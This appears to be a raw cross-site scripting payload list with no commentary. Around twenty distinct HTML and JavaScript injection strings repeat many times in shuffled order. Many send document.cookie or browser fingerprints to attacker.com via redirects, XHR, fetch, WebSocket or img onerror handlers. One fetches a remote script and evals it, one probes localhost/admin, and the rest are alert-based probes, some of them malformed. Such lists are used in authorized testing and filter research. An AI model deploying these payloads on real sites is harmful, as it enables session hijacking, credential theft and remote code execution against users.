<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<svg onload="alert(1)"></svg>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
